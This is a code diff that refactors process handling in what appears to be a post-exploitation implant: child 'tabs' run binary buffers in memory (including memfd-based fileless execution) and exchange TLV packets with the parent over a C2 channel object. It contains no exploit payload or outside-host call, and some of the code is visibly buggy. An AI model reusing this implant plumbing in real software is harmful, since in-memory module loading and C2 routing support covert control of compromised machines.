@@ -45,14 +45,27 @@
 
 static int create_tab_disk(tabs_t *tab, char *filename)
 {
+    c2_t *c2;
+    pid_t pid;
+
     int pipes[2];
     char *argv[1];
-    pid_t pid;
+
+    c2 = c2_create(tab->id, NULL_FD, NULL);
+
+    if (c2 == NULL)
+    {
+        return -1;
+    }
 
     pid = fork();
 
     if (pid == -1)
+    {
+        c2_destroy(c2, FD_CLOSE);
         return -1;
+    }
+
     else if (pid == 0)
     {
         dup2(pipes[0], STDIN_FILENO);
@@ -65,7 +78,8 @@ static int create_tab_disk(tabs_t *tab, char *filename)
     {
         fcntl(pipes[1], F_SETFL, O_NONBLOCK);
 
-        tab->fd = pipes[1];
+        c2->fd = pipes[1];
+        tab->c2 = c2;
         tab->pid = pid;
     }
 
@@ -74,25 +88,39 @@ static int create_tab_disk(tabs_t *tab, char *filename)
 
 static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
 {
+    c2_t *c2;
+    pid_t pid;
+
     int pipes[2];
     char *argv[1];
     unsigned char *frame;
 
-    pid_t pid;
-
     if (pipe(pipes) == -1)
+    {
         return -1;
+    }
 
     frame = malloc(size);
+
     if (frame == NULL)
+    {
         return -1;
+    }
 
     memcpy(frame, buffer, size);
     pid = fork();
 
+    c2 = c2_create(tab->id, NULL_FD, NULL);
+
+    if (c2 == NULL)
+    {
+        return -1;
+    }
+
     if (pid == -1)
     {
         free(frame);
+        c2_destroy(c2, FD_CLOSE);
         return -1;
     }
     else if (pid == 0)
@@ -100,17 +128,15 @@ static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
         dup2(pipes[0], STDIN_FILENO);
         argv[0] = "pwny";
 
-        #ifdef LINUX
-            #ifdef PAWN_MEMFD
-                pawn_exec_fd(buffer, argv, environ);
-            #else
-                pawn_exec(buffer, argv, environ);
-            #endif
-        #else
-            #ifdef MACOS
-                pawn_exec_bundle(buffer, argv, environ);
-            #endif
-        #endif
+#if defined(MACOS)
+        pawn_exec_bundle(frame, argv, NULL);
+#elif defined(LINUX)
+#if defined(PAWN_MEMFD)
+        pawn_exec_fd(frame, argv, environ);
+#else
+        pawn_exec(frame, argv, environ);
+#endif
+#endif
 
         free(frame);
         exit(EXIT_SUCCESS);
@@ -119,7 +145,8 @@ static int create_tab_buffer(tabs_t *tab, unsigned char *buffer, int size)
     {
         fcntl(pipes[1], F_SETFL, O_NONBLOCK);
 
-        tab->fd = pipes[1];
+        c2->fd = pipes[1];
+        tab->c2 = c2;
         tab->pid = pid;
     }
 
@@ -139,12 +166,14 @@ tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
     {
         log_debug("* Found tab entry (%d)\n", id);
 
-        if (tlv_pkt_write(tab->fd, c2->tlv_pkt) < 0)
+        if (c2_write(tab->c2, c2->tlv_pkt) < 0)
+        {
             return NULL;
+        }
 
         tlv_pkt = tlv_pkt_create();
 
-        if (tlv_pkt_read(tab->fd, tlv_pkt) < 0)
+        if (c2_read(tab->c2, tlv_pkt) < 0)
         {
             tlv_pkt_destroy(tlv_pkt);
             return NULL;
@@ -219,33 +248,43 @@ int tab_add_buffer(tabs_t **tabs, int id, unsigned char *buffer, int size)
     return -1;
 }
 
-int tab_exit(tabs_t *tab)
+void tab_wait(tabs_t *tab)
 {
     pid_t pid;
     int status;
-    tlv_pkt_t *tlv_pkt;
-
-    tlv_pkt = tlv_pkt_create();
-
-    if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
-        goto fail;
-
-    if (tlv_pkt_write(tab->fd, tlv_pkt) < 0)
-        goto fail;
-
-    log_debug("* Waiting for tab to shutdown (%d)\n", tab->id);
 
     do
     {
         pid = waitpid(tab->pid, &status, 0);
         if (pid == -1)
+        {
             break;
+        }
     }
     while (!WIFEXITED(status) && !WIFSIGNALED(status));
+}
+
+int tab_exit(tabs_t *tab)
+{
+    tlv_pkt_t *tlv_pkt;
+
+    tlv_pkt = tlv_pkt_create();
+
+    if (tlv_pkt_add_int(tlv_pkt, TLV_TYPE_TAG, TAB_TERM) < 0)
+    {
+        goto fail;
+    }
+
+    if (c2_write(tab->c2, tlv_pkt) < 0)
+    {
+        goto fail;
+    }
+
+    log_debug("* Waiting for tab to shutdown (%d)\n", tab->id);
+    tab_wait(tab);
 
     log_debug("* Tab %d on PID %d shutdown\n", tab->id, tab->pid);
 
-    close(tab->fd);
     return 0;
 
 fail:
@@ -262,9 +301,14 @@ int tab_delete(tabs_t **tabs, int id)
     if (tab != NULL)
     {
         if (tab_exit(tab) < 0)
+        {
             return -1;
+        }
 
         HASH_DEL(*tabs, tab);
+
+        c2_destroy(tab->c2, FD_CLOSE);
+        free(tab);
 
         log_debug("* Deleted tab entry (%d)\n", id);
         return 0;
@@ -280,11 +324,14 @@ void tabs_free(tabs_t *tabs)
     for (tab = tabs; tab != NULL; tab = tab->hh.next)
     {
         if (tab_exit(tab) < 0)
+        {
             continue;
+        }
 
         log_debug("* Freed tab entry (%d)\n", tab->id);
         HASH_DEL(tabs, tab);
 
+        c2_destroy(tab->c2, FD_CLOSE);
         free(tab);
     }
 
